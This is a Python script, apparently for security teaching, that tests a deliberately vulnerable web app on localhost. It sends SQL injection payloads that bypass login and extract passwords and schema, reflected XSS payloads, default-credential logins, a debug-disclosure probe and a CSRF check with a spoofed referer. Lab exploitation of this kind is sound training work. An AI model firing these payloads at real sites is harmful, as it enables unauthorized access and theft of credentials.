#!/usr/bin/env python3
import requests
import json
import sys
import time
from typing import Dict, List, Tuple
from dataclasses import dataclass
from urllib.parse import urljoin
import html

@dataclass
class TestResult:
    name: str
    success: bool
    details: str
    payload: str

class VulnerabilityTester:
    def __init__(self, base_url: str = "http://localhost:5001"):
        self.base_url = base_url
        self.session = requests.Session()
        self.results: List[TestResult] = []

    def run_all_tests(self):
        """Run all vulnerability tests"""
        self.test_sql_injection_login()
        self.test_sql_injection_search()
        self.test_xss_reflected()
        self.test_default_credentials()
        self.test_debug_mode()
        self.test_csrf()
        self.print_results()

    def add_result(self, name: str, success: bool, details: str, payload: str):
        """Add a test result"""
        self.results.append(TestResult(name, success, details, payload))

    def test_sql_injection_login(self):
        """Test SQL injection vulnerabilities in login"""
        print("\n=== Testing SQL Injection (Login) ===")
        
        payloads = [
            {
                "name": "Basic login bypass",
                "username": "admin' OR '1'='1",
                "password": "anything",
                "expected": "dashboard"
            },
            {
                "name": "Comment out password",
                "username": "admin'--",
                "password": "anything",
                "expected": "dashboard"
            },
            {
                "name": "Union-based injection",
                "username": "' UNION SELECT 'admin','admin123',1--",
                "password": "anything",
                "expected": "dashboard"
            },
            {
                "name": "Error-based injection",
                "username": "admin' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 1/0 END)='1",
                "password": "anything",
                "expected": "dashboard"
            }
        ]

        for payload in payloads:
            print(f"\nTrying: {payload['name']}")
            try:
                response = self.session.post(
                    urljoin(self.base_url, "/login"),
                    data={
                        "username": payload["username"],
                        "password": payload["password"]
                    },
                    allow_redirects=True
                )
                
                success = payload["expected"] in response.text.lower()
                details = (
                    f"Success - Got expected response"
                    if success
                    else f"Failed - Response didn't contain expected text"
                )
                
                self.add_result(
                    f"SQL Injection (Login) - {payload['name']}", 
                    success,
                    details,
                    f"Username: {payload['username']}, Password: {payload['password']}"
                )
                
                print(f"Status: {response.status_code}")
                print(f"Success: {success}")
                print(f"Response preview: {response.text[:200]}")
                
            except Exception as e:
                self.add_result(
                    f"SQL Injection (Login) - {payload['name']}", 
                    False,
                    f"Error: {str(e)}",
                    payload["username"]
                )

    def test_sql_injection_search(self):
        """Test SQL injection vulnerabilities in search"""
        print("\n=== Testing SQL Injection (Search) ===")
        
        payloads = [
            {
                "name": "List all users",
                "query": "' OR '1'='1",
                "expected": "admin"
            },
            {
                "name": "Table information",
                "query": "' UNION SELECT sql,name,type FROM sqlite_master WHERE type='table'--",
                "expected": "user"
            },
            {
                "name": "Extract passwords",
                "query": "' UNION SELECT password,username,id FROM user--",
                "expected": "admin123"
            },
            {
                "name": "Column information",
                "query": "' UNION SELECT group_concat(name),group_concat(type),sql FROM pragma_table_info('user')--",
                "expected": "username"
            }
        ]

        for payload in payloads:
            print(f"\nTrying: {payload['name']}")
            try:
                response = self.session.get(
                    urljoin(self.base_url, "/search"),
                    params={"q": payload["query"]}
                )
                
                success = payload["expected"] in response.text.lower()
                details = (
                    f"Success - Found expected data"
                    if success
                    else f"Failed - Expected data not found in response"
                )
                
                self.add_result(
                    f"SQL Injection (Search) - {payload['name']}", 
                    success,
                    details,
                    payload["query"]
                )
                
                print(f"Status: {response.status_code}")
                print(f"Success: {success}")
                print(f"Response preview: {response.text[:200]}")
                
            except Exception as e:
                self.add_result(
                    f"SQL Injection (Search) - {payload['name']}", 
                    False,
                    f"Error: {str(e)}",
                    payload["query"]
                )

    def test_xss_reflected(self):
        """Test XSS vulnerabilities"""
        print("\n=== Testing XSS ===")
        
        payloads = [
            {
                "name": "Basic XSS",
                "payload": "<script>alert('XSS')</script>",
                "expected": "<script>alert('XSS')</script>"
            },
            {
                "name": "IMG onerror XSS",
                "payload": '<img src=x onerror=alert(1)>',
                "expected": 'onerror=alert'
            },
            {
                "name": "SVG XSS",
                "payload": "<svg/onload=alert('XSS')>",
                "expected": "<svg/onload=alert"
            },
            {
                "name": "JavaScript Protocol XSS",
                "payload": 'javascript:alert(1)',
                "expected": 'javascript:alert'
            },
            {
                "name": "Encoded XSS",
                "payload": '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;',
                "expected": '<script>alert'
            }
        ]

        for payload in payloads:
            print(f"\nTrying: {payload['name']}")
            try:
                # Test in search parameter
                search_response = self.session.get(
                    urljoin(self.base_url, "/search"),
                    params={"q": payload["payload"]}
                )
                
                # Test in username after login
                login_response = self.session.post(
                    urljoin(self.base_url, "/login"),
                    data={
                        "username": payload["payload"],
                        "password": "anything"
                    },
                    allow_redirects=True
                )
                
                # Check if our payload is reflected without being escaped in either response
                success = (
                    payload["expected"] in search_response.text or 
                    payload["expected"] in login_response.text
                )
                
                details = []
                if payload["expected"] in search_response.text:
                    details.append("Reflected in search")
                if payload["expected"] in login_response.text:
                    details.append("Reflected in username")
                
                details_str = (
                    f"Success - {' and '.join(details)}"
                    if success
                    else "Failed - Payload was escaped or modified"
                )
                
                self.add_result(
                    f"XSS - {payload['name']}", 
                    success,
                    details_str,
                    payload["payload"]
                )
                
                print(f"Search Status: {search_response.status_code}")
                print(f"Login Status: {login_response.status_code}")
                print(f"Success: {success}")
                if success:
                    print("Found in search response:", payload["expected"] in search_response.text)
                    print("Found in login response:", payload["expected"] in login_response.text)
                
            except Exception as e:
                self.add_result(
                    f"XSS - {payload['name']}", 
                    False,
                    f"Error: {str(e)}",
                    payload["payload"]
                )

    def test_default_credentials(self):
        """Test default credentials"""
        print("\n=== Testing Default Credentials ===")
        
        try:
            response = self.session.post(
                urljoin(self.base_url, "/login"),
                data={
                    "username": "admin",
                    "password": "admin123"
                },
                allow_redirects=True
            )
            
            success = "dashboard" in response.text.lower()
            details = (
                "Success - Logged in with default credentials"
                if success
                else "Failed - Default credentials didn't work"
            )
            
            self.add_result(
                "Default Credentials", 
                success,
                details,
                "admin:admin123"
            )
            
            print(f"Status: {response.status_code}")
            print(f"Success: {success}")
            
        except Exception as e:
            self.add_result(
                "Default Credentials", 
                False,
                f"Error: {str(e)}",
                "admin:admin123"
            )

    def test_debug_mode(self):
        """Test debug mode information disclosure"""
        print("\n=== Testing Debug Mode ===")
        
        try:
            # Try the specific debug test endpoint
            response = self.session.get(urljoin(self.base_url, "/debug-test"))
            
            # Check for various debug indicators
            debug_indicators = [
                "werkzeug",
                "traceback",
                "debug mode",
                "Debug mode test",  # Our specific error message
                "500 internal server error"
            ]
            
            # Check if any of the debug indicators are present
            success = any(indicator in response.text.lower() for indicator in debug_indicators)
            details = (
                "Success - Debug information disclosed"
                if success
                else "Failed - Debug mode might be disabled"
            )
            
            self.add_result(
                "Debug Mode Information Disclosure", 
                success,
                details,
                "/debug-test"
            )
            
            print(f"Status: {response.status_code}")
            print(f"Success: {success}")
            if success:
                # Find which indicators were present
                found_indicators = [i for i in debug_indicators if i in response.text.lower()]
                print(f"Found debug indicators: {', '.join(found_indicators)}")
            print(f"Response preview: {response.text[:200] if success else 'No debug info'}")
            
        except Exception as e:
            self.add_result(
                "Debug Mode Information Disclosure", 
                False,
                f"Error: {str(e)}",
                "/debug-test"
            )

    def test_csrf(self):
        """Test CSRF vulnerabilities"""
        print("\n=== Testing CSRF ===")
        
        try:
            # First, check if there's any CSRF protection in the login form
            login_page = self.session.get(urljoin(self.base_url, "/login"))
            has_csrf_token = 'csrf' in login_page.text.lower()
            
            # Try to login without any CSRF token
            response = self.session.post(
                urljoin(self.base_url, "/login"),
                data={
                    "username": "admin",
                    "password": "admin123"
                },
                headers={
                    "Referer": "http://evil-site.com"  # Simulate cross-site request
                }
            )
            
            # If we can login with a different referer and no CSRF token, it's vulnerable
            success = "dashboard" in response.text.lower() and not has_csrf_token
            details = (
                "Success - No CSRF protection found, login accepted from different origin"
                if success
                else "Failed - CSRF protection might be in place"
            )
            
            self.add_result(
                "CSRF Vulnerability", 
                success,
                details,
                "POST request from different origin"
            )
            
            print(f"Status: {response.status_code}")
            print(f"Success: {success}")
            print(f"CSRF Token Present: {'No' if not has_csrf_token else 'Yes'}")
            
        except Exception as e:
            self.add_result(
                "CSRF Vulnerability", 
                False,
                f"Error: {str(e)}",
                "POST request from different origin"
            )

    def print_results(self):
        """Print test results in a formatted way"""
        print("\n=== VULNERABILITY TEST RESULTS ===\n")
        
        total_tests = len(self.results)
        successful_tests = sum(1 for r in self.results if r.success)
        
        print(f"Total Tests: {total_tests}")
        print(f"Successful Exploits: {successful_tests}")
        print(f"Failed Exploits: {total_tests - successful_tests}")
        print("\nDetailed Results:")
        print("=" * 80)
        
        for result in self.results:
            print(f"\nTest: {result.name}")
            print(f"Status: {'✅ VULNERABLE' if result.success else '❌ NOT VULNERABLE'}")
            print(f"Details: {result.details}")
            print(f"Payload: {result.payload}")
            print("-" * 80)

def main():
    print("Starting vulnerability tests...")
    print("WARNING: This is for educational purposes only!")
    
    try:
        tester = VulnerabilityTester()
        tester.run_all_tests()
        
    except requests.exceptions.ConnectionError:
        print("\nERROR: Cannot connect to the application.")
        print("Make sure it's running at http://localhost:5001")
        sys.exit(1)
    except KeyboardInterrupt:
        print("\nTesting interrupted by user.")
        sys.exit(0)
    except Exception as e:
        print(f"\nAn error occurred: {str(e)}")
        sys.exit(1)

if __name__ == "__main__":
    main() 